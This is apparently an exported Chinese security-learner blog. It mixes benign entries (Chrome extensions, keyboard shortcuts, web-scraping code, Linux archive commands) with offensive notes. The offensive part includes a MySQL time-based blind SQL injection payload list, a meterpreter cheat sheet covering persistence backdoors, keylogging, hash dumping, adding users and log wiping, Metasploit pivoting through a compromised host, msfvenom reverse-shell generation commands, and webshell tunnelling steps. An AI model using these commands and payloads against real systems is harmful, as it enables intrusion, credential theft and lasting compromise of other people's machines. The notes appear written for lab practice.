Chrome是木马，所以换了一个插件使用，以防万一咯。里面自带的种类比较少，可以自己从网上下载User-Agent的xml文件，导入进去：右击——》选项——》左侧Import/Export Settings——》右侧选择文件 Word Highlight谷歌搜索关键字高亮插件 Search the current site提供当前浏览网站的站内搜索功能 AdBlock广告屏蔽，屏蔽youtube广告很厉害 Advertising Terminator也是一个屏蔽广告的插件，据说是广告终结者 IP Whois &amp; Flags Chrome &amp; Websites Rating显示当前浏览网站的IP、Whois信息等 删除谷歌重定向避免谷歌搜索结果链接重定向，同时防止点击追踪 LastPassChrome上最好用的密码管理软件，支持密码自动填充、生成密码 Vimium可以让你抛弃鼠标的一个插件（键盘快捷键） Holmes浏览器书签搜索，快捷键：alt+shift+h Allow Copy允许网页的复制 crxMouse Chrome Gestures鼠标手势 Eye Dropper取色器 Show Password on Focus显示密码框内的密码 RescueTime记录你在每个网站上耗用的时间 WebpageScreenshot最好用的网页截图 OneTab节省打开n多标签页时占用的内存 右键搜扩展右键菜单 Chrono下载管理器接管所有下载 Clear Cache点击图标即可清除缓存、cookie等 Code Cola可视化编辑在线页面CSS样式 WEB前端助手(FeHelper)FE助手：字符串编码解码、图片base64编码、代码压缩、梅花、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析 二维码(QR码)生成器(QR Code Generator)给当前页面生成二维码 Markdown Here写邮件、印象|为知笔记在线版编辑文字时，遵循markdown语法编辑文字 Listen 1听音乐用的，很好用，在github上：https://github.com/listen1/listen1 The Great Suspnender大家都知道，Chrome 有个通病，就是当你打开多个标签页的时候，比较占用内存资源。浴室这个插件就派上用场了，安装这个插件之后，你设置一定的时间，比如半小时之后，其他标签页如果没有操作，就会被自动回收，节省内存，而当你再切换回之前标签页的时候，会是一片空白，只需要鼠标点击下自动重新加载。 Similar Web可以知道一个网站的流量、来源、排名、竞争等信息 Grammarly可以帮助英语写作，自动检查一些英语单词的拼写和语法，并直接推荐正确的单词或句子 Stylish为任意网站自定义主题 BuiltWith Technology Profiler能够看到网站使用什么技术写的 Note Anywhere让你在任意网页任意位置上贴上小便签 Search by Image(by Google)通过图片搜索图片：可以再网页上任何的图片身上右击以图搜图 Context Menu SearchChrome右键默认只有Google搜索，这个插件可以使用多个搜索引擎：百度、淘宝、必应、360等 Postman一个相当好用的HTTP请求调试工具，能够发送任何类型的HTTP requests，附带任何数量的参数 Regex Search用正则表达式搜索网页内容 快捷键：windows和Linux的 标签页和窗口快捷键：12345678910111213141516开启新窗口：ctrl+n无痕模式打开新窗口：ctrl+shift+n最小化当前窗口：alt+空格+n最大化当前窗口：alt+空格+x退出当前窗口：alt+F4退出Chrome：ctrl+shift+q关闭当前标签页：ctrl+w或ctrl+F4关闭所有打开的标签页和浏览器：ctrl+shift+w开启新标签页：ctrl+t恢复刚关闭的一个标签页：ctrl+shift+t跳转到下一个打开的标签页：ctrl+tab或ctrl+pgdn跳转到上一个打开的标签页：ctrl+shift+tab或ctrl+pgup跳转到指定标签页：ctrl+1~8跳转到最后一个标签页：ctrl+9回退：alt+左箭头前进：alt+右箭头 功能快捷键：1234567891011书签栏的显示/隐藏：ctrl+shift+b打开书签管理器：ctrl+shift+o打开历史记录：ctrl+h打开下载内容：ctrl+j打开开发者工具：ctrl+shift+j或F12打开清除浏览数据：ctrl+shift+delete打开Chrome帮助中心：F1打开Chrome的任务管理器：shift+esc搜索：ctrl+f或F3跳转到搜索的下一条内容：ctrl+g跳转到搜索的上一条内容：ctrl+shift+g 地址栏快捷键：1234567使用默认搜索引擎搜索：输入搜索关键字按enter键使用其他搜索引擎搜索：输入搜索引擎名称并按tab键为网站名称添加www.和.com并打开：输入网站名称并按ctrl+enter打开新的标签页并执行google搜索：输入搜索字词并按alt+enter键跳转到地址栏：ctrl+l、alt+d或F6从页面中的任意位置搜索：ctrl+k或ctrl+e从地址栏中移除联想查询内容：按下箭头以突出显示相应内容，然后按shift+delete 网页快捷键：12345678910111213141516171819202122232425打印当前网页：ctrl+p保存当前网页：ctrl+s重新加载当前网页：F5或ctrl+r重新加载当前网页（忽略缓存的内容）：shift+F5或ctrl+shift+r停止加载网页：esc浏览下一个可点击项：tab浏览上一个可点击项：shift+tab使用chrome打开计算机中的文件：按住ctrl+o并选择文件显示当前网页的HTML源码：ctrl+u将当前网页保存为书签：ctrl+d将所有打开的标签页以书签的形式保存在新文件夹中：ctrl+shift+d全屏：F11放大网页上的所有内容：ctrl++缩小网页上的所有内容：ctrl+-将网页上的所有内容恢复到默认大小：ctrl+0向下滚动网页，一次一个屏幕：空格或pgdn向上滚动网页，一次一个屏幕：shift+空格或pgup在网页上水平滚动：按住shift并滚动鼠标滚轮将光标移动到文本字段中的上一个字词前面：ctrl+左箭头将光标移动到文本字段中的上一个字词后面：ctrl+右箭头删除文本字段中的上一个字词：ctrl+backspace将焦点移动到通知上：alt+n在通知中允许：alt+shift+a在通知中拒绝：alt+shift+d在当前标签页中打开主页：alt+home 鼠标快捷键：12345在新的后台标签页中打开链接：按住ctrl点击链接打开链接，并跳转到该链接：按住ctrl+shift点击链接在新窗口中打开链接：按住shift点击链接下载链接目标：按住alt点击链接显示浏览记录：右击后退或前进]]></content>
      <categories>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取Nmap中文官方文档]]></title>
    <url>%2F2017%2F09%2F28%2FCrawlerNmapDoc%2F</url>
    <content type="text"><![CDATA[如题 爬取Nmap中文官方文档因为将要面试了，想要熟悉一下Nmap，感觉看官方文档最权威，又比较喜欢在本地查看，所以就写了一个爬虫，下载到本地保存成html，没什么技术含量，感兴趣的可以看一下。 中间也是遇到了一些坑。 在浏览器中不挂代理是可以访问的，所以一开始连接不上网页，我还以为是代码写的有问题或做了一些反爬虫机制，一行一行的去调试。后来发现是墙外的，必须挂代理才能访问。又添加了一个使用ShadowSocks代理的功能，然后就可以正常爬取了。 后来保存文件时，我想保存成中文的文件名，结果成了乱码，尝试’wb’写入对文件名无效，最后是尝试着是filename.decode(‘utf-8’)可以成功写成中文文件名。我也不知道是为什么。编码这里还是很薄弱的，以后再好好弥补。 本来以为这样就没什么问题了，后来程序运行到一半就报错了，文件也只保存了一部分，还是打开文件的位置报错，然后就一步一步的调试，发现有一个文件名是“防火墙/IDS躲避和哄骗”，因为文件名不能包含’/‘这个字符，所以报错。又补充了一下将文件名中的’/‘替换成’、’，这样程序才正常运行下来。 脚本链接]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫脚本]]></title>
    <url>%2F2017%2F09%2F24%2FsimpleReptile%2F</url>
    <content type="text"><![CDATA[老师领着我们敲了一遍爬虫，可以爬取安全维基上的技术文章。原脚本使用了urllib2,bs4,re库，单线程，可以获取标题、链接、时间 脚本链接 留给我们的作业是获取作者和文章分类，实现多线程。此外我自己改用了requests库 脚本链接]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>py脚本</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ftp爆破py脚本]]></title>
    <url>%2F2017%2F09%2F24%2FftpBlastPYScript%2F</url>
    <content type="text"><![CDATA[一个py脚本，用来爆破ftp服务器的。第一次自己写脚本，很多地方不规整，记录一下自己的第一步。下载地址]]></content>
      <categories>
        <category>py脚本</category>
      </categories>
      <tags>
        <tag>ftp爆破</tag>
        <tag>py脚本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用python写网络爬虫的三种网页内容抓取方法]]></title>
    <url>%2F2017%2F09%2F24%2FCrawlerCrawlPageMethod%2F</url>
    <content type="text"><![CDATA[如题所示 用python写网络爬虫的三种网页抓取方法辅助函数用来下载页面html源码： 1234567891011121314import urllib2def download(url,user_agent=&apos;wswp&apos;,num_retries=2): print &apos;Downloading:&apos;,url headers=&#123;&apos;User-agent&apos;:user_agent&#125; request=urllib2.Request(url,headers=headers) try: html=urllib2.urlopen(request).read() except urllib2.URLError as e: print &apos;Download error:&apos;,e.reason html=None if num_retries &gt;0 : if hasattr(e,&apos;code&apos;) and 500 &lt;=e.code&lt;600: return download(url,user_agent,num_retries-1) return html 三种方法方法一：正则表达式1234import reurl=&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;html=download(url)print re.findall(&apos;&lt;tr id=&quot;places_area__row&quot;&gt;&lt;td class=&quot;.*?&quot;&gt;&lt;label class=&quot;readonly&quot; for=&quot;places_area&quot; id=&quot;places_area__label&quot;&gt;Area: &lt;/label&gt;&lt;/td&gt;&lt;td class=&quot;w2p_fw&quot;&gt;(.*?)&lt;/td&gt;&lt;td class=&quot;w2p_fc&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&apos;,html) 方法二：BeautifulSoup模块BeautifulSoup模块可以解析网页，提供定位内容的便捷接口，并且能够正确解析缺失的引号并闭合标签。美中不足的是由于是python编写，速度偏慢 12345678from bs4 import BeautifulSoupurl=&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;html=download(url)soup=BeautifulSoup(html)tr=soup.find(attrs=&#123;&apos;id&apos;:&apos;places_area__row&apos;&#125;)td=tr.find(attrs=&#123;&apos;class&apos;:&apos;w2p_fw&apos;&#125;)area=td.textprint area 方法三：LxmlLxml是基于libxml2解析库的python封装，因使用C语言编写，比BeautifulSoup更快，下面是使用lxml的CSS选择器抽取面积的示例代码 123456import lxml.htmlhtml=download(&apos;http://example.webscraping.com/places/default/view/Afghanistan-1&apos;)tree=lxml.html.fromstring(html)td=tree.cssselect(&apos;tr#places_area__row &gt; td.w2p_fw&apos;)[0]area=td.text_content()print area CSS选择器示例： 选择所有标签：* 选择a标签：a 选择所有class=”link”的元素：.link 选择id=”home”的a标签：a#home 选择父元素为a标签的所有span子标签：a &gt; span 选择a标签内部的所有span标签：a span 选择title属性为”Home”的所有a标签：a[title=Home]]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>网页内容抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下统计当前文件夹的文件和目录个数命令说明]]></title>
    <url>%2F2017%2F09%2F20%2FlinuxCountFiles%2F</url>
    <content type="text"><![CDATA[如题 linux下统计当前文件夹下的文件个数、目录个数详细说明命令：12345678统计文件夹下文件的个数，包括子文件夹里的ls -lR|grep &quot;^-&quot;|wc -l统计文件夹下目录的个数，包括子文件夹里的ls -lR|grep &quot;^d&quot;|wc -l统计当前文件夹下文件的个数ls -l |grep &quot;^-&quot;|wc -l统计当前文件夹下目录的个数ls -l |grep &quot;^d&quot;|wc -l 说明：12345678ls -l 显示当前文件夹下的文件列表（包括目录）ls -lR 显示当前文件夹下的所有文件列表（包括子目录文件）‘|’ 在Linux中是管道符，将前面命令的输出作为后面命令的输入grep 是过滤，只显示匹配成功的结果&quot;^-&quot; 是正则表达式，表示只显示以 &apos;-&apos;开头的行，&quot;^d&quot; 表示只显示以&apos;d&apos;开头的行。Linux中文件（非目录）是以&apos;-&apos;开头的，而目录是以&apos;d&apos;开头的。wc 是统计用的。 -l 参数用来输出输入的行的数目]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux中的压缩命令记录]]></title>
    <url>%2F2017%2F09%2F19%2FlinuxCompress%2F</url>
    <content type="text"><![CDATA[如题 Linux中的压缩命令记录常用的几种格式：iso/zip/7z/rar/tar/tar.gz/xz tar：1234v表示详细tar -tvf test.tar # 查看包内容tar -cvf test.tar * # 打包tar -xvf test.tar # 解包 tar.gz：123tar -tzvf test.tar.gz # 查看包内容tar -czvf test.tar.gz * # 打包tar -xzvf test.tar.gz # 解包 tar.bz2：123tar -tjvf test.tar.bz2 # 查看包内容tar -cjvf test.tar.bz2 * # 打包tar -xjvf test.tar.bz2 # 解包 zip：1234567unzip -v test.zip # 查看包内容zip -r test.zip * # 压缩（r表示递归）zip -m test.zip test.txt # 往zip中添加文件zip -rP pwd test.zip * # -P 加密压缩unzip test.zip # 解压unzip -P pwd test.zip # 解密解压unzip -n/-o test.zip # -n代表如果存在则不覆盖/-o代表如果存在则覆盖 iso：123挂载文件mount test.iso /media # 挂载镜像到/media目录umount /media # 取消挂载（不使用的情况下，可以取消挂载） xz：12345高压缩（速度慢）xz -z test.tar # 压缩（直接将源文件进行压缩）xz -d test.tar.xz # 解压xz -t test.tar.xz # 测试压缩文件完整性xz -l test.tar.xz # 显示压缩文件的信息 7z和rar在Linux中使用的不多，需要额外安装 7z：123apt-get install p7zip-full7za a -t7z -r test.7z # 压缩（a代表压缩，-t指定文件类型，-r表示递归）7za x test.7z -r # 解压（x代表解压，-r表示递归） rar：1234567apt-get install rarapt-get install unrarunrar l test.rar # 查看压缩包内容rar a test.rar * # 压缩（a代表添加到压缩文件）rar x test.rar # 解压（x代表解压）unrar e test.rar # 解压（e直接解压到当前目录）unrar t test.rar # 检查压缩包的完整性]]></content>
      <categories>
        <category>命令说明</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>压缩命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql延时盲注payload]]></title>
    <url>%2F2017%2F09%2F16%2FsleepBlandSQLInjection%2F</url>
    <content type="text"><![CDATA[如题 Mysql延时盲注payloadpayload123456789101112131415161718一、得到正确的注入方式?id=1&apos; and sleep(5) --+ 进行注入尝试，如果页面休眠5秒后返回，则证明该注入方式是可以使用的，sql语句已生效?username=admin&apos; and if(1=2,1,sleep(10))#二、判断数据库名?id=1&apos; and if((select length(database())&gt;7)&gt;0,sleep(5),null) --+ 判断数据库长度是否大于7?id=1&apos; and if((select ascii(substr(database(),1,1))&gt;97)&gt;0,sleep(5),null) --+ 判断数据库名的第一个字符ascii是否大于97?id=1&apos; and if((select database())=&quot;security&quot;,sleep(5),null) --+ 判断数据库名是否为security，如果是则休眠5秒，否则立即返回三、判断版本号?id=1&apos; and if((select version()) like &quot;10%&quot;,sleep(5),null) --+ 判断版本号是否为10开头的（一般用5），如果是则休眠5秒四、判断表名?id=1&apos; and if ((select length(table_name)&gt;4 from information_schema.tables limit 2,1)&gt;0,sleep(5),null); --+ 判断第三个表的表名长度是否大于4?id=1&apos; and if ((select substr(table_name,1,1) from information_schema.tables limit 2,1)=&apos;u&apos;,sleep(5),null); --+ 判断第三个表的表名的第一个字母是否为u五、判断列名?id=1&apos; and if ((select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(5),null); --+ 判断users表的第一列名的长度是否大于1?id=1&apos; and if((select ascii(substr(column_name,1,1))&gt;97 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(3),null)--+ 判断users表的第一列名的第一个字符ascii是否大于97六、得到数据?id=1&apos; and if((select length(username)&gt;1 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username列的第一条数据的长度是否大于1?id=1&apos; and if((select ascii(substr(username,1,1))&gt;65 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username的第一条数据的第一个字符的ascii是否大于65]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>延时盲注</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[run vnc遇到的问题解决]]></title>
    <url>%2F2017%2F09%2F16%2FsolveRunVnc%2F</url>
    <content type="text"><![CDATA[解决run vnc无法进行控制的问题，以及-c参数无法打开 run vnc无法控制屏幕解决：打开/usr/share/metasploit-framework/scripts/meterpreter/vnc.rb添加：然后问题就解决了 -c参数无法打开courtesy shell：]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>meterpreter</tag>
        <tag>run vnc</tag>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[meterpreter常用命令+脚本]]></title>
    <url>%2F2017%2F09%2F16%2FmeterpreterCommand%2F</url>
    <content type="text"><![CDATA[如题 meterpreter常用命令+脚本常用命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041、background返回，把meterpreter后台挂起2、sessions-u 将shell会话提升为meterpreter会话-v 以详细模式列出会话-x 增加扩展信息展示-l 查看已经成功获取的会话-i 与指定的会话进行交互，即切换到指定id的会话-k 杀掉指定id的会话-K 杀掉所有会话-C 执行一个meterpreter的命令-c 执行一个meterpreter的命令，需指定id-s 执行一个脚本，指定id3、shell获取目标主机的远程命令行shell，使用exit退出回到meterpreter4、cat查看目标主机上的文档内容cat c:\\boot.ini 或c:/boot.ini 查看主机启动引导信息 5、getwd与getlwd获取肉鸡的当前目录 和 获取本机的当前目录6、upload上传文件到肉鸡upload nc.exe c:/windows/system32/7、download下载文件到本地download c:\\boot.ini /root/8、edit调用vi编辑器，对目标主机上的文件进行修改edit c:\\windows\\system32\\drivers\\etc\\hosts9、search在肉鸡上搜索文件search -d c:/ -f *.doc10、ipconfig查看ip地址11、portfwd端口转发portfwd add -l 1234 -p 3389 -r 192.168.86.136，远程登录 0.0.0.0:1234 即可12、route显示肉鸡上的路由表13、getuid查看当前用户14、sysinfo查看系统信息15、ps查看肉鸡上运行的进程16、migrate将meterpreter会话移至到另一个进程17、execute让肉鸡运行某个程序-f 使用时需要加上-H 后台执行-a 传递给命令的参数-c 交互命令时使用-i 进程创建之后进行交互-m 从内存执行例：execute -H -m -d notepad.exe -f wce.exe -a &quot;-o wce.txt&quot;-d 在肉鸡执行时显示的进程名称（用来伪装），-m直接从内存中执行，&quot;-o wce.txt&quot;是wce.exe的运行参数18、getpid获取meterpreter的进程id19、shutdown关机20、post/windows/gather/forensics/enum_drives可获取目标主机存储器信息run post/windows/gather/forensics/enum_drives21、checkvm确定主机是否是一台虚拟机run checkvm22、persistence植入后门程序run persistence -X -i 5 -p 4444 -r 192.168.20.186-X 在肉鸡上开机自启动-i 不断尝试反向连接的时间间隔-r lhost-p lport23、metsvc将payload安装为服务（meterpreter），会建立一个端口成为服务器run metsvc24、getgui开启目标主机远程桌面，添加账号run getgui -e 开启远程桌面run getgui -u hacker -p hacker 添加用户25、getsystem提升权限到system26、keyscn键盘记录器keyscan_start 开始键盘记录keyscan_stop 停止键盘记录keyscan_dump 下载键盘记录27、hashdump获取账号密码28、post/windows/gather/enum_applications获取肉鸡上的软件安装信息run post/windows/gather/enum_applications29、post/windows/gather/dumplinks获取肉鸡最近访问过的文档、链接信息run dumplinks30、post/windows/gather/enum_ie读取目标主机IE浏览器cookies等缓存信息run post/windows/gather/enum_ie31、get_local_subnets查看已拿下的目标主机的内网IP段情况run get_local_subnets32、clearev痕迹擦除 好用脚本路径：（/usr/share/metasploit-framework/scripts/meterpreter）： 123456789101112131415161718192021checkvm 检查是否是虚拟机vnc 上传一个vnc服务到对方机器，然后在本地打开vnc服务并连接autoroute 可以添加，删除，显示路由表get_application_list 获取安装的程序列表enum_firefox 获取firefox中的信息arp_scanner 存活主机扫描（常用在内网） run arp_scanner -r 192.168.86.0/24get_env 获取环境变量credcollect 获取主机上的hash等凭证getgui 可以开启远程桌面服务，添加用户，端口转发 run getgui -f 12345 -e（3389转发到12345） run getgui -u hacker -p hacker （添加用户）dumplinks 文件操作记录（时间戳、文件位置、共享名、序列号等）duplicate 再次产生payload，注入到其他进程或打开新进程注入credcollect 收集主机的hash凭证metsvc 将payload安装为服务（meterpreter），会建立一个端口成为服务器persistence 建立一个持久性的后门hostsedit 操作hosts文件keylogrecorder 内置此功能winenum 自动运行多种命令，将命令结果保存到本地hashdump 与meterpreter的hashdump一样win32-sshserver 安装openssh服务（Linux）enum_logged_on_users 列出当前登陆的用户getvncpw 获取vnc密码]]></content>
      <categories>
        <category>meterpreter</category>
      </categories>
      <tags>
        <tag>meterpreter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msf中代理使用方法]]></title>
    <url>%2F2017%2F09%2F15%2FmsfProxy%2F</url>
    <content type="text"><![CDATA[有的时候我们可能得到一台肉鸡的权限（meterpreter会话），想用这台肉鸡作为跳板去攻击肉鸡内网或互联网上的其他机器，就需要我们使用肉鸡作为代理啦。 msf中代理使用方法前提：已与肉鸡建立meterpreter会话 环境：攻击机kali：192.168.20.186 肉鸡xp：192.168.86.136内网其他机器server2003：192.168.86.138 实验思路： 要使用肉鸡作为代理，首先我们要先与对方建立会话，得到相应权限 然后本地建立一个路由表，让我们可以通过session 1找到肉鸡（因为有可能对方是在内网中，我们无法直接通过IP地址找到）。 通过sock4a模块，让肉鸡开启sock4a服务。 在本地配置proxychains，配置自己的sock4a客户端，让我们可以连接到sock4a服务端。连接后，proxychains的流量都会走肉鸡，为自己增加了一层代理保护。 步骤：1、1sessions -l 查看会话列表 2、12route add 192.168.86.136 255.255.255.0 1 添加路由表命令说明： route add 肉鸡ip 子网掩码 sessionId 1route 查看路由表，可以看到刚刚添加进去的路由信息 3、1234use auxiliary/server/socks4a 使用socks4a模块set srvhost 127.0.0.1 set srvport 1080exploit -y 4、12vi /etc/proxychains.conf 打开一个新终端，配置proxychains在最后添加一条 socks4 127.0.0.1 1080 ，保存退出 5、1proxychains rdesktop 192.168.86.138 远程登录内网server2003机器 代理成功]]></content>
      <categories>
        <category>metasploit</category>
        <category>代理</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit使用笔记]]></title>
    <url>%2F2017%2F09%2F14%2Fmetasploit%2F</url>
    <content type="text"><![CDATA[如题 metasploit使用笔记配置阶段123456789101112131415161718192021help 查看帮助set 设置unset 取消设置setg 设置全局show options=options 查看配置info 查看详细信息（比options详细）back 从一个模块回到msf&gt;状态reload_all 当放入自己的脚本之后需要reload_all载入search 搜索makerc 自己编译rc文件db_connect 连接数据库db_export 导出db_import 导入db_nmap 运行namp，并把输出直接记录到数据库里db_rebuild_cache 重建缓存（创建数据库之后需要重建缓存）vulns 记录某个机器曾经有过什么漏洞exploit 开始攻击exploit -j 后台攻击jobs 查看后台运行的jobjobs -i jobid 显示详情kill jobId 杀死指定job auxiliary/scanner/… 扫描模块 exploit/multi/handler 框架模块 meterpreter阶段12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364常见命令help 查看帮助background 将当前会话移至后台bgkill 杀死一个后台meterpreterbglist 查看所有后台meterpreterbgrun 后台运行channel 显示活动频道close 关闭通道exit 终止meterpreter会话getpid 查看当前进程号getuid 查看当前用户ps 查看进程列表migrate 注入到一个指定的进程中quit 终止meterpreter会话shell 获取shellgetsystem 自行尝试提权sysinfo 查看系统信息hashdump 抓取hash密码timestomp 修改文件属性**文件系统命令**cat 读取文件内容upload 上传文件download 下载文件cd 更改目录del 删除文件edit 用vim编辑文件getlwd 打印本地目录getwd 打印工作目录ls 列出文件目录mkdir 创建目录pwd 查看当前路径rm 删除文件rmdir 删除目录**网络命令**ipconfig 查看IP地址portfwd 端口转发route 查看或修改路由表**系统命令**clearav 清除事件日志drop_token 下载令牌execute 执行命令getsystem 自行尝试提权getpid 获取进程idgetuid 获取用户kill 终止指定进程ps 列出正在运行的进程reboot 重启reg 进行注册表操作shutdown 关闭计算机steal_token 窃取指定pid的令牌sysinfo 获取系统信息**用户界面命令**enumdesktops 列出所有可访问台式机getdesktop 获取当前的meterpreter桌面idletime 检查空闲进程keyscan_dump 存储键盘记录keyscan_start 开启键盘记录keyscan_stop 停止键盘记录screenshot 屏幕截图set_desktop 更改meterpreter桌面 sessions使用123456sessions -h 查看帮助sessions&lt;===&gt;sessions -l 查看会话列表sessions -i 进入指定会话sessions -K 杀死所有会话sessions -k 杀死指定会话sessions -u 提升会话为Meterpreter]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msfvenom的常用命令]]></title>
    <url>%2F2017%2F09%2F13%2Fmsfvenom%2F</url>
    <content type="text"><![CDATA[如题 msfvenom的常用命令msfvenom正向（bind_tcp）是我们连接肉鸡，反向（reverse_tcp）是肉鸡连接我们。一般会使用反向payload，原因是正向连接会在肉鸡上开启一个端口，容易被发现。 Options:12345678910111213141516171819-p, –payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-f, –format &lt; format&gt; 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)-e, –encoder [encoder] 指定需要使用的encoder（编码器）-a, –arch &lt; architecture&gt; 指定payload的目标架构–platform &lt; platform&gt; 指定payload的目标平台-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度-b, –bad-chars &lt; list&gt; 设定规避字符集，比如: &amp; #039;\x00\xff&amp; #039;-i, –iterations &lt; count&gt; 指定payload的编码次数-c, –add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x, –template &lt; path&gt; 指定一个自定义的可执行文件作为模板-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行–payload-options 列举payload的标准选项-o, –out &lt; path&gt; 保存payload-v, –var-name &lt; name&gt; 指定一个自定义的变量，以确定输出格式–shellest 最小化生成payload-h, –help 查看帮助选项–help-formats 查看msf支持的输出格式列表 不同系统下生成木马的命令12345678910111213141516171819202122232425262728293031Linuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elfWindowsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exeMacmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb PayloadsPHPmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php（测试未成功）ASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.aspJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jspWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.warPythonmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pymsfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pyBashmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.shPerlmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>msfvenom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[脚本代理工具使用总结]]></title>
    <url>%2F2017%2F09%2F13%2FscriptProxy%2F</url>
    <content type="text"><![CDATA[如题 脚本代理工具使用总结理论：正向代理和反向代理 正向：我们发起请求，连接远程目标 反向：远程目标发起请求，绕过防火墙，连接我们的攻击机（需要有公网IP、端口） web脚本工具：reDuh（鼻祖，不太好用）使用方法： 内有客户端和服务端两个版本。先将服务端的文件上传到服务器上，尝试访问并记录链接。访问链接如上图则表明成功。然后打开客户端，将记录的链接放入，写入进行转发的端口号和要连接的目标机的IP（此时认为自己站在服务器上，如果输入127.0.0.1，则是连接服务器的某个端口），先点击start，然后点击Create。会将端口映射到自己电脑的指定端口。然后使用相应的程序连接自己本地的端口即可 tunna（不太好用）使用方法： 将webshells中的conn文件上传到服务器，访问文件如果是一片空格则证明成功了。 攻击机使用命令： python proxy.py -u 连接网址 -l 本地端口 -r 目标端口 -a 127.0.0.1 例：1python proxy.py -u http://192.168.20.54/uploads/scanGE/conn.php -l 2222 -r 3389 -a 192.168.5.136 则连接本地的2222相当于连接内网192.168.5.136的3389如果此时映射3389（假设对方不允许远程登录），则也可以成功连接。 如果只监听自己的2222，不指定对方端口，则需要配合代理软件（例如shadowsocks需要使用firefox的代理来配合） reGeorg+proxifier（或sc32.exe）（目前最好用的）原理： Proxifier可以让指定程序的流量全部走指定的端口，而reGeorgSocksProxy脚本可以将服务器映射到本地监听端口，则所有通过本地监听端口的流量就相当于是走了服务器，所以可以访问到服务器内网 使用方法： 将tunnel文件上传的服务器，访问文件网址，出现下图则证明成功攻击机上执行： python reGeorgSocksProxy -u 木马网址 -p 本地监听端口 例：1python reGeorgSocksProxy.py -u http://192.168.20.54/uploads/scanGE/tunnel.php -p 1234 使用Proxifier工具进行端口代理 打开proxifier端口代理工具——》Profile——》proxy Servers 添加一个 127.0.0.1 本地监听端口号 socket 5Proxifier——》Proxification Rules——》添加对应的程序（例如3389用mstsc）——》下面action选择刚刚添加的代理——》Target Ports 